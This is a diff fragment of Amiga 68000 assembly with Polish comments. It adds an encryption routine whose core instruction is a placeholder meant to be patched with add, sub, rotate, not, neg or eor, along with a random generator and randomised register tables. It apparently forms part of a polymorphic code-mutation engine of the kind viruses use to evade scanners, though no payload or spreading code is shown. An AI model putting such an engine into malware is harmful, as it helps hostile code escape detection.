+	bra.s	_do_shit_loop		
+
+_shit_bra_b
+	move.w	d0,d1
+	add.w	#$5ffe,d1
+	move.w	d1,(a1)+
+
+_do_shit_loop
+	subq.w	#3,d0
+_shit_loop
+	move.b	-(a0),(a1)+
+	dbf	d0,_shit_loop
+	rts
+	
+;==================================
+
+_crypt_routine
+_crypt_adr
+	move.l	#$0,a0		;adres
+_crypt_count
+	move.w	#$0,d3		;licznik
+	
+	move.w	arg(pc),d1	;argument
+
+_crypt_loop
+	move.b	(a0),d0		;move.x (a0),d0
+
+_crypt_instr
+	nop			;add_sub_ror_rol_not_neg_eor.x d1,d0
+
+	move.b	d0,(a0)+	;move.x	d0,(a0)+
+	
+	dbf	d3,_crypt_loop
+
+_CacheClear
+
+	movem.l	d0/d1/a0/a1,-(sp)
+	move.l	4.w,a6
+	jsr	-636(a6)
+	movem.l	(sp)+,d0/d1/a0/a1
+	rts
+
+_rnd
+	moveq	#0,d7
+	moveq	#-1,d6
+	move.l	seed(pc),d0
+	move.l	d0,d4
+
+rnd_loop1:
+	moveq	#7,d5
+rnd_loop2:
+	add.l	#$11111111,d6
+	bcc.s	_1
+	eor.l	d4,d6
+	ror.l	d5,d4
+	add.l	d4,d6
+_1:	dbra	d5,rnd_loop2
+	addq.l	#7,d4
+	ror.l	#3,d6
+	move.l	d6,(a0)+
+
+	addq.w	#1,d7
+	cmp.w	#384,d7
+	blt.s	rnd_loop1
+	rts
+
+_tablica_argumentow
+;==================
+
+lea_adress			dc.l	0
+adres_petli			dc.l	0
+arg				dc.w	$fe
+seed				dc.l	1
+
+length_of_code_to_crypt		dc.w	0
+code_to_encrypt			dc.l	0
+where_to_store_crypted_code	dc.l	0
+
+
+registers
+;========
+_adress_reg		dc.w	0	;a adress
+_counter_reg		dc.w	0	;d count
+_arg_reg		dc.w	0	;d arg
+
+
+buffer
+
+;	blk.l	1000
+
